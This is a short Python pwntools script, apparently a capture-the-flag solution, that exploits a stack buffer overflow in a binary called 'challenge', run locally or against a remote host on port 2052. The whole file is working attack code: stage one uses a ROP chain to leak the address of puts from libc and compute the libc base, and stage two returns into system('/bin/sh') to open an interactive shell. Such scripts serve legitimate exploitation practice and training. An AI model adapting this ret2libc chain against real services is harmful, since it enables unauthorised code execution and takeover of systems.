#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

elf  = ELF('./challenge')
libc = ELF('./lib/x86_64-linux-gnu/libc-2.31.so')

if args.REMOTE:
    con = remote('overly.uniquename.xyz', 2052)
else:
    con = process('./challenge', env={"LD_PRELOAD" : "./lib/x86_64-linux-gnu/libc-2.31.so"})

padding = b'A' * 536

ret     = p64(0x40101a)
pop_rdi = p64(0x401313)

main     = p64(elf.symbols['main'])
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])

# Stage 1
# Leak address of puts in libc
stage_1_payload = [
    padding,
    pop_rdi,
    puts_got,
    puts_plt,
    main,
]

stage_1_payload = b''.join(stage_1_payload)

con.sendline(stage_1_payload)

con.recvline()
con.recvline()
con.recvline()
puts_libc = u64(con.recvline().strip().ljust(8, b'\x00'))

libc_base = puts_libc - libc.symbols['puts']

system = p64(libc_base + 0x055410)
binsh  = p64(libc_base + 0x1b75aa)
exit   = p64(libc_base + 0x049bc0)

# Stage 2
# execute system("/bin/sh")
stage_2_payload = [
    padding,
    ret,
    pop_rdi,
    binsh,
    system,
    exit,
]

stage_2_payload = b''.join(stage_2_payload)

con.sendline(stage_2_payload)

con.interactive()

